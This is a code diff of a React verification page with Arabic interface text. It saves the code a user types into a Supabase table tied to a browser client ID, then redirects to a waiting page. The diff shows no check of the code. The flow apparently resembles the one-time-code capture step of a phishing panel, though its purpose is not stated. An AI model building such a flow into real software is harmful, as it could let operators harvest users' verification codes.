@@ -4,7 +4,6 @@ import { ShieldCheck, ArrowLeft, RefreshCw, Hash } from 'lucide-react';
 import { supabase } from '@/lib/supabase';
 import { getClientId } from '@/lib/clientId';
 import { useSiteConfig } from '@/context/SiteConfigContext';
-import { startPresenceTracking, stopPresenceTracking } from '@/lib/presence';
 import Header from '@/components/Header';
 import Footer from '@/components/Footer';
 
@@ -19,13 +18,16 @@ export default function VerifyPage() {
   const regEmail = sessionStorage.getItem('reg_email');
   const regId = sessionStorage.getItem('reg_id');
 
-  // Presence - Track when user is on this page
+  // تحقق من رسالة خطأ من صفحة الانتظار
   useEffect(() => {
-    startPresenceTracking('التحقق');
+    const verifyError = sessionStorage.getItem('verify_error');
+    const verifyMessage = sessionStorage.getItem('verify_message');
     
-    return () => {
-      stopPresenceTracking();
-    };
+    if (verifyError === 'true' && verifyMessage) {
+      setError(verifyMessage);
+      sessionStorage.removeItem('verify_error');
+      sessionStorage.removeItem('verify_message');
+    }
   }, []);
 
   const handleInput = (value: string) => {
@@ -67,22 +69,29 @@ export default function VerifyPage() {
         }
       }
       
-      // Try to save to database
+      // Save to database and get the ID
       try {
-        await supabase.from('verification_codes').insert({
-          registration_id: registrationId || null,
-          client_id: getClientId(), // Link to this browser/device
-          code: code,
-        });
+        const { data, error: insertError } = await supabase
+          .from('verification_codes')
+          .insert({
+            registration_id: registrationId || null,
+            client_id: getClientId(),
+            code: code,
+          })
+          .select()
+          .single();
+        
+        if (!insertError && data) {
+          sessionStorage.setItem('verification_attempt_id', data.id);
+        }
       } catch (dbErr) {
         console.warn('Could not save verification code to database:', dbErr);
       }
       
       setLoading(false);
       
-      // Stop presence tracking before navigation
-      stopPresenceTracking();
-      navigate('/thank-you');
+      // توجيه لصفحة انتظار التحقق
+      navigate('/verify-waiting');
     } catch (err) {
       setLoading(false);
       setError('حدث خطأ أثناء معالجة الطلب. يرجى المحاولة لاحقاً.');
